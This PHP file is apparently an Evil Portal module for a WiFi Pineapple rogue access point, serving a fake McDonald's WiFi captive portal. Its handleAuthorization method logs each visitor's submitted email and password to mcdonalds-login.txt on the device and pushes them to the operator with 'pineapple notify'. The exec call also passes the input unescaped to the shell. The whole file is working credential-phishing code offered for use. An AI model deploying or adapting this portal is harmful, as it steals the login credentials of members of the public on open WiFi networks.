<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        
        $dirs = array(
            '/root/', 
            '/sd/',
        );

        $dirs = array_filter($dirs, 'file_exists');
        $dirs = array_filter($dirs, 'is_writeable');

        if (empty($dirs)) {
            die("die");
        }

        $dir = array_pop($dirs);
        $want = $dir . DIRECTORY_SEPARATOR . 'evilportal-logs';

        if (file_exists($want)) {
        } 

        else {
            mkdir($want);
        }

        if (!file_exists($want)) {
        }

        if (!is_dir($want)) {
        }

        if (!is_writeable($want)) {
        }

        $want .= DIRECTORY_SEPARATOR;

        if (isset($_POST['email'])) {
            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            file_put_contents("$dir/evilportal-logs/mcdonalds-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
            exec("pineapple notify $email' - '$pwd");
        }
        // handle form input or other extra things there

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}